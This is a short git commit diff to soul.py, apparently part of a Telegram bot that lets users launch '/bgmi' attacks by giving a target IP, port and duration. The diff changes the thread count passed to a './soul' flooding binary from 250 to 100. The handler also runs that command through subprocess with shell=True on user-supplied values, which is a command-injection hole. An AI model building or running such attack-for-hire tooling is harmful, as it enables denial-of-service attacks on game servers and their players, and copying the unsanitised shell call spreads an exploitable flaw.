b3ae4ca512b1e2d15da927f4b7378a0aa7719868
MEGOXERHUB9353 <githubmegoxer@gmail.com>
2025-01-01 00:23:05 +0530

    Update soul.py

--- soul.py
+++ soul.py
@@ -237,7 +237,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./soul {target} {port} {time} 250"
+                full_command = f"./soul {target} {port} {time} 100"
                 subprocess.run(full_command, shell=True)
                 response = f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 ✅"
         else:
